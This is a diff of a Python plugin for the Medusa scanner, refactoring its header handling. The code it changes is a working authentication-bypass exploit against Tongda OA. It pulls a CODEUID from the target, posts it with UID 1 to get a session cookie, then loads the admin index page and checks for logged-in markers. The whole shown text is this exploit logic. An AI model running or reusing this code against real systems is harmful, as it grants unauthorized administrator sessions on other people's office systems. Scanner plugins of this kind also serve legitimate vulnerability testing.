@@ -22,7 +22,7 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
     scheme, url, port = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
@@ -38,23 +38,16 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         payload_url2 = scheme + "://" + url + ":" + str(port) + payload2
         payload3="/general/index.php"
         payload_url3 = scheme + "://" + url + ":" + str(port) + payload3
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
-        res = requests.get(payload_url, headers=headers, proxies=proxies, timeout=6, verify=False)
+
+        res = requests.get(payload_url, headers=Headers, proxies=proxies, timeout=6, verify=False)
         restext = str(res.text).split('{')
         codeuid = restext[-1].replace('}"}', '').replace('\r\n', '')
-        resp = requests.post(payload_url2,data={'CODEUID': '{'+codeuid+'}', 'UID': int(1)},headers=headers, proxies=proxies, timeout=6, verify=False)
+        resp = requests.post(payload_url2,data={'CODEUID': '{'+codeuid+'}', 'UID': int(1)},headers=Headers, proxies=proxies, timeout=6, verify=False)
         head = resp.headers.get('Set-Cookie').replace('path=/', '')
-        headers2 = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-            "Cookie":head
-        }
-        resp2 = requests.get(payload_url3,headers=headers2, proxies=proxies, timeout=6, verify=False)
+
+        Headers["Cookie"]=head
+
+        resp2 = requests.get(payload_url3,headers=Headers, proxies=proxies, timeout=6, verify=False)
         code = resp2.status_code
         con=resp2.text
         if code == 200 and (con.find("""<li><a id="on_status_1" href="javascript:""")!=-1 and con.find("""<a id="logout_btn" class="logout" href="javascript""")!=-1 ) or (con.find("通达云市场")!=-1 and con.find("通达OA在线帮助")!=-1 and con.find("注销")!=-1):
